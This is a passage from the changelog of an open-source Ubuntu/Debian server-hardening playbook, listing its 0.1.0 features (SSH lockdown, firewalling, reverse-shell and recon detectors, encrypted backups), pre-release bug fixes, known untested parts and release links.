  multiple advisories per package into one upgrade, supports `--dry-run`,
  `--package`, and `--min-severity`, and opens the PR via `gh` or the
  GitHub API. Deliberately intended for a workstation or CI, **not** the
  production server, so no write-scoped token has to live on an
  internet-facing box.
- **`examples/cve-pr-workflow.yml`** — drop-in GitHub Actions workflow to
  run Tier 2 weekly in CI.
- CI now compile-checks the CVE scanner and smoke-tests its lockfile
  parsing (including dev-dependency exclusion).

## [0.1.0] - 2026-07-26

First tagged release. A one-command Ubuntu/Debian hardening playbook with
a breach-detection suite, ransomware-resistant backups, and a beginner
wizard. Hardened before release across **two real-hardware test runs**
(Ubuntu 22.04 and 24.04); see [docs/RETROSPECTIVE.md](docs/RETROSPECTIVE.md)
for the honest limits.

### Added

- **10-layer playbook:** base hardening, SSH lockdown (keys-only, no
  root/passwords), UFW + fail2ban, optional fwknop Single Packet
  Authorization, Node/Docker app runtime + hardened Nginx + TLS,
  localhost-only least-privilege database, encrypted off-site backups,
  auditd detection, the detector suite, and a client security report.
- **Breach-detection suite** with a forensics-first response pipeline
  (captures evidence to `/var/log/sentinel` *before* any kill/block):
  - reverse-shell scanner (socket-stdio shells + service/app users
    spawning shells) — validated on real hardware;
  - recon-burst detector (a session enumerating the system) — validated;
  - experimental SSH login-pattern watcher, **off by default**.
- **Ransomware-resistant backups:** client-side `age` encryption to a
  Backblaze B2 bucket with a **no-delete** key, plus a monthly
  restore-test playbook.
- **Optional egress lockdown** (default-deny outbound).
- **Onboarding:** `bootstrap.sh` installer and an interactive wizard that
  generates keys, auto-detects the Telegram chat id, and guides
  non-technical users; beginner-friendly README.
- **`tests/redteam.sh`** — validates each detector against real attacks on
  a throwaway box.
- **CI** (syntax check, ansible-lint, shellcheck, detector py_compile) incl.
  a distro-representative ansible-core 2.16 job; MIT license; ASCII banner.

### Fixed

Issues caught and fixed before release during the real-hardware runs:

- MySQL tasks referenced a non-existent `ansible.mysql` collection, which
  broke **every** playbook invocation (even `--syntax-check`) on the
  ansible-core versions distros ship. Now `community.mysql`.
- `ansible-galaxy` pulled collections newer than the distro ansible-core
  supported. `requirements.yml` now pins compatible ranges.
- A missing `watcher_pattern` could fail **after** SSH was already locked
  down. Added defaults and a fail-fast `pre_tasks` preflight assert that
  validates every required variable **before** any change.
- One broken optional role broke unrelated runs (static import). Optional
  roles now load dynamically only when their feature is configured.
- `auditd` rules not loading on `systemctl restart`; `ausearch` hanging and
  starving detectors; a reverse-shell false positive on journald sockets.

### Known limitations

Backups/restore, fwknop, app/DB/TLS roles, Telegram delivery, `active`
mode, and non-Ubuntu-22.04 targets are shipped but **not yet validated
end-to-end**. See [docs/RETROSPECTIVE.md](docs/RETROSPECTIVE.md).

[Unreleased]: https://github.com/pythonistastic/auto_sec/compare/v0.3.2...HEAD
[0.3.2]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.3.2
[0.3.1]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.3.1
[0.3.0]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.3.0
[0.2.1]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.2.1
[0.2.0]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.2.0
[0.1.0]: https://github.com/pythonistastic/auto_sec/releases/tag/v0.1.0
